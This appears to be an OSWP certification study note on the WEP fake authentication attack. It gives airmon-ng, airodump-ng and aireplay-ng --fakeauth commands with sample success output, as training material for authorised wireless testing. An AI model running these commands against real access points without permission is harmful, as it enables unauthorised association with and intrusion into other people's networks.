# OSWP - Fake Authentication Attack (WEP)

The fake authentication attack allows you to perform the two types of WEP authentication (Open System and Shared Key) plus associate with the access point (AP). This is only useful when you need an associated MAC address in various aireplay-ng attacks and there is currently no associated client. It should be noted that the fake authentication attack does NOT generate any ARP packets. Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points.

## Commands

* Run [setup](../../setup.md) first
* Two terminals are needed, so `screen` is your friend
* No clients should be associated with AP or at least clients are idle

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $ADAPTER $CHANNEL

# Start monitoring - make terminal large enough to see everything
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the fake authentication attack
sudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE
```

```bash
# Success
01:56:20  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 3
01:56:20  Sending Authentication Request (Open System) [ACK]
01:56:20  Authentication successful
01:56:20  Sending Association Request [ACK]
01:56:20  Association successful :-) (AID: 1)

# Also a new client is added and AUTH set to OPN
[CH  3 ][ Elapsed: 5 mins ][ 2023-06-13 01:57 ][ paused output
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
AA:BB:CC:DD:EE:FF  -53 100     2987      303    0   3   54e. WEP  WEP    OPN  wifu

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
AA:BB:CC:DD:EE:FF  AA:AA:AA:AA:AA -71   54e-54e     0      457
```
## Wireshark

TBD

## References

* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Fake Authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication)
* [REdBlueTeam](https://youtu.be/_9qJ1Urpn0Y?t=1860)